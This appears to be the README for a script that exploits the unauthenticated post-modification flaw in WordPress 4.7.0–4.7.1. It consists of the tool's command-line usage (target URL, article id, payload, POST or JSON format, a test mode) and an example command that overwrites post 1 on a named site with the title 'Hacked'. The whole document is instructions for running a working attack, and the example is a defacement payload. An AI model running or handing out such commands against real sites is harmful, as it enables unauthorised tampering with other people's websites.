# WordPress 4.7.0-4.7.1 unauthenticated post modification

```
usage: 4.7.0-4.7.1-unauthenticated-post-modification.py [-h] [--url URL]
                                                        [--id ID] [--test]
                                                        [--payload P]
                                                        [--format F] [-v] [-q]

optional arguments:
  -h, --help         show this help message and exit
  --url URL, -u URL  Wordpress base url, including URI scheme
  --id ID, -i ID     Article id
  --test, -t         Test without breaking things
  --payload P, -p P  Formatted payload
  --format F, -f F   Format (POST, JSON)
  -v                 Increase output verbosity
  -q                 Make the program quieter
```
  
Example: `python 4.7.0-4.7.1-unauthenticated-post-modification.py --url https://monsite.com --id 1 --payload "title=Hacked&content=please update your wp"`